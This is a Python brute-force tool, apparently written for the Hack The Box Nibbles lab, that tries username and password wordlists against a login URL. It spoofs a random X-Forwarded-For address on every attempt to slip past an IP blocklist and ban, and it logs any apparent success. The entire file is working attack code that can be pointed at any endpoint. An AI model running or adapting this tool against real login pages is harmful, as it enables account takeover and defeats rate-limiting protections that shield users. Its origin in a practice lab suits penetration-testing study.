import requests
import urllib3
import random
import argparse
import sys
import threading
"""
Tool originally created to get past an IP blocklist on the HTB:Nibbles machine.
"""

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

#TODO: Create a function to generate/return a random ip address when called
def make_ip():
        octet_list = [x for x in range(1,256)]
        # print(octet_list)
        o1 = str(random.choice(octet_list))
        o2 = str(random.choice(octet_list))
        o3 = str(random.choice(octet_list))
        o4 = str(random.choice(octet_list))
        return(o1+"."+o2+"."+o3+"."+o4)

#TODO: Make a function to prepare the headers, payload, make the request, and check the response.
request_count = 0
def make_request(endpoint, uname, pword, ip_addy):
        payload = {"username": uname,
                   "password": pword}
        headers = {"X-Forwarded-For": ip_addy}
        r  = requests.post(endpoint, proxies=proxies, data=payload, headers=headers)
        global request_count
        request_count += 1
        if 'Incorrect username or password.' in r.text:
                print(f"[-] {str(request_count)}:FAIL    -   {uname}:{pword}")
        elif 'Nibbleblog security error' in r.text:
                print("[-] Looks like you might've just gotten banned..")
        else:
                print(f"[+] Oooooh that looked different!\n{uname}:{pword}")
                with open("script_output.txt", "w") as f:
                        f.write("Possible win with: " + uname + ":" + pword)
                sys.exit(f"Possible win with {uname}:{pword}")



parser = argparse.ArgumentParser(description='Make a login attempt and change IP address every attempt')
#TODO: Use argparse to accept username/password as singular or as a wordlist from cli
# Usage: prog.py --url <endpoint> -l(L) <username> -p(P) <passwords>
parser.add_argument('-u', '--url', help="Full url for login endpoint")
parser.add_argument('-l', help="Supply a single username to use")
parser.add_argument('-L', type=argparse.FileType('r'), help="Supply a wordlist of usernames")
parser.add_argument('-p', help="Supply a single password to use")
parser.add_argument('-P', type=argparse.FileType('r'), help="Supply a wordlist of passwords")
args = parser.parse_args()

#TODO make a decision about where user/pass are coming from
# Grab either a single username or a list of usernames
if args.l:
        USERNAME = args.l
else:
        if args.L:
                USERNAME = [n.strip() for n in args.L]
        else:
                raise argparse.ArgumentError(args.l, "Must declare a username somehow..")
# Grab either a single password or a list of passwords
if args.p:
        PASSWORD = args.p
else:
        if args.P:
                PASSWORD = [n.strip() for n in args.P]
        else:
                raise argparse.ArgumentError(args.p, "Must declare some kind of password")


#TODO: Iterate through wordlists and call a new random ip every (5) attempts.
# Two scenarios: single name iterator or multi-name iterator
ENDPOINT = args.url
if type(USERNAME) == str:
        if type(PASSWORD) == str:
                new_ip = make_ip()
                make_request(ENDPOINT, USERNAME, PASSWORD, new_ip)
                t1 = threading.Thread(target=make_request, args=(USERNAME, PASSWORD, new_ip))
        else:
                for password in PASSWORD:
                        new_ip = make_ip()
                        make_request(ENDPOINT, USERNAME, password, new_ip)
elif type(USERNAME) == list:
        for user in USERNAME:
                if type(PASSWORD) == str:
                        new_ip = make_ip()
                        make_request(ENDPOINT, user, PASSWORD, new_ip)
                elif type(PASSWORD) == list:
                        for passw in PASSWORD:
                                new_ip = make_ip()
                                make_request(ENDPOINT, user, passw, new_ip)


#TODO: Profit
print(f"Made a total of: {str(request_count)} requests during that session")
